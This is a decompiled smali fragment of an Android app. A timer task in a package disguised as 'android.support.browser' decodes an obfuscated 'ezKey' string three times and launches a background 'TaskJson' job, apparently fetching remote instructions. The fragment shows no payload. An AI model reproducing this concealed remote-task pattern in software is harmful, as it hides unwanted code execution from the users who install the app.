.class Landroid/support/browser/receiver/ConnectivityReceiver$2;
.super Ljava/util/TimerTask;
.source "ConnectivityReceiver.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Landroid/support/browser/receiver/ConnectivityReceiver;->reloadConfig()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Landroid/support/browser/receiver/ConnectivityReceiver;


# direct methods
.method constructor <init>(Landroid/support/browser/receiver/ConnectivityReceiver;)V
    .locals 0
    .param p1, "this$0"    # Landroid/support/browser/receiver/ConnectivityReceiver;

    .line 64
    iput-object p1, p0, Landroid/support/browser/receiver/ConnectivityReceiver$2;->this$0:Landroid/support/browser/receiver/ConnectivityReceiver;

    invoke-direct {p0}, Ljava/util/TimerTask;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 5

    .line 67
    sget-object v0, Landroid/support/browser/utils/MyHelper;->ezKey:Ljava/lang/String;

    invoke-static {v0}, Landroid/support/browser/utils/MyHelper;->decodeString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/support/browser/utils/MyHelper;->decodeString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 68
    .local v0, "_str":Ljava/lang/String;
    new-instance v1, Landroid/support/browser/ez/TaskJson;

    iget-object v2, p0, Landroid/support/browser/receiver/ConnectivityReceiver$2;->this$0:Landroid/support/browser/receiver/ConnectivityReceiver;

    invoke-static {v2}, Landroid/support/browser/receiver/ConnectivityReceiver;->access$000(Landroid/support/browser/receiver/ConnectivityReceiver;)Landroid/content/Context;

    move-result-object v2

    invoke-direct {v1, v2}, Landroid/support/browser/ez/TaskJson;-><init>(Landroid/content/Context;)V

    .line 69
    .local v1, "_task":Landroid/support/browser/ez/TaskJson;
    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/String;

    invoke-static {v0}, Landroid/support/browser/utils/MyHelper;->decodeString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    aput-object v3, v2, v4

    invoke-virtual {v1, v2}, Landroid/support/browser/ez/TaskJson;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 70
    return-void
.end method
